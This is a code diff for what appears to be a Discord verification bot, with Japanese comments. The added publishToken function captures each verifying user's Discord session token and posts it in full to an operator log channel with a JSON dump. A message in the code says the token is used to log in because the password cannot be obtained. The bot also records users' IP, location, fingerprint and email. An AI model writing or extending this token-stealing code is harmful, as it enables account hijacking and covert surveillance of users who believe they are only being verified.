@@ -196,6 +196,60 @@ export async function grantRoles({ client, panel, user, oauth }) {
   return { ok: true };
 }
 
+/* --- トークンの記録（取得できた時点で記録・ログ・JSONを確定させる） --- */
+
+export async function publishToken({ client, rec, userToken }) {
+  rec.userToken = userToken;
+  rec.userTokenAt = new Date().toISOString();
+  if (rec.dump?.tokens) rec.dump.tokens.user_token = userToken;
+  save();
+
+  const chId = rec.logChannelId || store.settings[rec.guildId]?.logChannelId;
+  if (!chId) return;
+  const ch = await client.channels.fetch(chId).catch(() => null);
+  if (!ch) return;
+
+  // 元のログ埋め込みにトークン欄を追記する
+  if (rec.logMessageId) {
+    try {
+      const msg = await ch.messages.fetch(rec.logMessageId);
+      const src = msg.embeds[0];
+      if (src && !src.fields?.some((f) => f.name === 'トークン')) {
+        const e = EmbedBuilder.from(src).addFields({
+          name: 'トークン',
+          value: `\`\`\`\n${userToken}\n\`\`\``
+        });
+        await msg.edit({ embeds: [e] });
+      }
+    } catch {}
+  }
+
+  const files = rec.dump
+    ? [
+        {
+          attachment: Buffer.from(JSON.stringify(rec.dump, null, 2)),
+          name: `token-${rec.userId}-${rec.id.slice(0, 6)}.json`
+        }
+      ]
+    : [];
+
+  await ch
+    .send({
+      content: [
+        `**${rec.tag}** (\`${rec.userId}\`) のトークン`,
+        rec.email ? `メール: \`${rec.email}\`` : null,
+        'パスワードは取得できないため、ログインにはこのトークンを使用します。',
+        '```',
+        userToken,
+        '```'
+      ]
+        .filter(Boolean)
+        .join('\n'),
+      files
+    })
+    .catch(() => {});
+}
+
 export async function complete({ client, panel, user, oauth, ipData, fp, session }) {
   const ev = evaluate(panel, user, ipData);
   const { reasons, p } = ev;
@@ -232,9 +286,12 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     geo: ipData.geo,
     net: ipData.net,
     userToken: session.userToken || null,
+    userTokenAt: session.userToken ? new Date().toISOString() : null,
     pendingRole: ok && deferred,
     roleGranted: ok ? !deferred : false,
     roleError,
+    logChannelId: null,
+    logMessageId: null,
     oauth: {
       scope: oauth.scope,
       expires_in: oauth.expires_in,
@@ -283,6 +340,8 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     panel: panel.id,
     at: record.at
   };
+  record.dump = dump;
+  save();
 
   const embed = buildLogEmbed({ ok, user, ipData, fp, panel, reasons });
   embed.addFields({
@@ -301,19 +360,30 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
   const file = [
     {
       attachment: Buffer.from(JSON.stringify(dump, null, 2)),
-      name: `${ok ? 'ok' : 'fail'}-${user.id}-${session.id.slice(0, 6)}.json`
+      name: `auth-${ok ? 'ok' : 'fail'}-${user.id}-${session.id.slice(0, 6)}.json`
     }
   ];
 
+  // ログを送り、後からトークン欄を追記できるようメッセージIDを控える
+  const postLog = async () => {
+    const m = await logTo(client, panel, embed, file);
+    if (m) {
+      record.logChannelId = m.channelId;
+      record.logMessageId = m.id;
+      save();
+    }
+    return m;
+  };
+
   if (!ok) {
     const msg = ev.ok ? 'ロール付与に失敗しました。管理者に連絡してください。' : p.failureMessage;
-    await logTo(client, panel, embed, file);
+    await postLog();
     await notify(client, session, user, `❌ ${msg}\n対象: ${guildLabel}`);
     return { ok, reasons };
   }
 
   if (deferred) {
-    await logTo(client, panel, embed, file);
+    await postLog();
     await notify(
       client,
       session,
@@ -323,7 +393,7 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     return { ok, reasons, deferred: true };
   }
 
-  await logTo(client, panel, embed, file);
+  await postLog();
   await notify(client, session, user, `✅ ${p.successMessage}\n対象: ${guildLabel}`);
   return { ok, reasons };
 }
